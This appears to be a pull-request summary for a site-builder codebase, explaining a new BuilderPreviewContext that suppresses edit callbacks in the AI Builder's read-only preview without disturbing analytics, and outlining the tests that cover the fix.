**Root Cause & Fix:** `isOwner` is dual-purpose (also gates analytics-exclusion), so it can't be reused to hide edit UI in the AI Builder's read-only preview without breaking real-storefront-traffic analytics. Added a dedicated `BuilderPreviewContext` (`src/components/site-renderer/BuilderPreviewContext.tsx`) and made `SiteRenderer.tsx`'s callback resolution the single source of truth: `callbackValue = onBlockFieldChange && !isBuilderPreview ? {...} : null` — every consumer (hero/logo/gallery overlays, WhatsApp button, cart widget, CTA) reads `useBlockEditCallback()`/`useIsBuilderPreview()` and gets `null`/`true` automatically in builder-preview, instead of each caller needing its own `isBuilderPreview` check.

**Test Coverage Strategy:**
- TC-GH1461-01..03: probe-block pattern (`mockGetComponent.mockReturnValue(ProbeBlock)`) captures the raw context value seen inside a rendered block tree.
- TC-GH1461-04..05: same probe pattern but asserts the *derived* callback, not just the raw flag — verified by temporarily reverting the `SiteRenderer.tsx` fix and confirming TC-GH1461-04 fails with the pre-fix behavior (not a tautological test).
- TC-GH1461-WA-01/02: render the real `WhatsappButtonBlock` with `useBlockEditCallback` mocked directly (no SiteRenderer needed) to lock the block's own click-suppression contract independent of the context-propagation tests above.
